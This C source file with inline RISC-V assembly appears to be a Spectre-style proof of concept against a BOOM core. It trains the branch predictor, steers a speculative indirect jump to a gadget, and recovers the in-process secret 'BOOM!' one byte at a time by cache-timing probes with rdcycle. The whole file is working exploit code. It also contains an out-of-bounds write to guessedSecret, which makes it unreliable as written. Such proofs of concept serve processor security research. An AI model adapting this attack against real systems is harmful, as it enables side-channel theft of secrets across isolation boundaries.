#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define TRAIN_TIMES 40 // assumption is that you have a 3 bit counter in the predictor
#define ATTACK_SAME_ROUNDS 10
#define SECRET_SZ 5
#define CACHE_HIT_THRESHOLD 50

uint64_t array1_sz = 10;
uint64_t passInIdx;
uint8_t array1[10] = {1,2,3,4,5,6,7,8,9,10};
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "BOOM!";

extern void want(void);  
extern void gadget(void);


int main(void){

    static uint64_t results[256];
    uint64_t start, diff;
    uint64_t wantAddr = (uint64_t)(&want); 
    uint64_t gadgetAddr = (uint64_t)(&gadget);
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1), randIdx;
    uint64_t passInAddr;
    uint8_t dummy = 0;
    
    char guessedSecret[SECRET_SZ];
    
    for(uint64_t i = 0; i < SECRET_SZ; i++) {

        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
                results[cIdx] = 0;

        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {
            
            flushCache((uint64_t)array2, sizeof(array2));
            
            for(int64_t j = TRAIN_TIMES; j >= 0; j--){
            
                    passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF;
                    passInAddr = (passInAddr | (passInAddr >> 16));
                    passInAddr = gadgetAddr ^ (passInAddr & (wantAddr ^ gadgetAddr));

                    randIdx = atkRound % array1_sz;
                    passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF;
                    passInIdx = (passInIdx | (passInIdx >> 16));
                    passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx));  

                    // set of constant takens to make the BHR be in a all taken state
                    for(uint64_t k = 0; k < 100; ++k){
                        asm("");
                    }

                    // this calls the function using jalr and delays the addr passed in through fdiv
                    asm volatile(
                        "addi %[addr], %[addr], -2\n"
                        "addi t1, zero, 2\n"
                        "slli t2, t1, 0x4\n"
                        "fcvt.s.lu fa4, t1\n"
                        "fcvt.s.lu fa5, t2\n"
                        "fdiv.s	fa5, fa5, fa4\n"
                        "fdiv.s	fa5, fa5, fa4\n"
                        "fdiv.s	fa5, fa5, fa4\n"
                        "fdiv.s	fa5, fa5, fa4\n"
                        "fcvt.lu.s	t2, fa5, rtz\n"
                        "add %[addr], %[addr], t2\n"
                        "jal set_up_target\n"
                        "capture_spec: j capture_spec\n"
                        "set_up_target: addi ra, %[addr], 4\n"
                        "addi sp, sp, -16\n"
                        "la %[addr], end\n"
                        "sd %[addr], 8(sp)\n"
                        "jr ra\n"
                        "end:\n"
                        :
                        : [addr] "r" (passInAddr)
                        : "t1", "t2", "fa4", "fa5");
                
                }
            
            for (uint64_t i = 0; i < 256; ++i){
                    start = rdcycle();
                    dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                    diff = (rdcycle() - start);
                    if (diff < CACHE_HIT_THRESHOLD)
                        results[i] += 1;
            }
        }
        
        uint64_t max = results[0], index = 0;
        for (uint64_t i = 1; i < 256; i++)
            if (max < results[i]) {
                max = results[i];
                index = i;
            }
        printf("The attacker guessed character %c %ld times.\n", index, max);  
        
        guessedSecret[i] = index;
        
        attackIdx++;
    }    
    
    guessedSecret[SECRET_SZ] = 0;
    
    printf("The guessed secret is %s\n", guessedSecret);
   
    return 0;
}
 
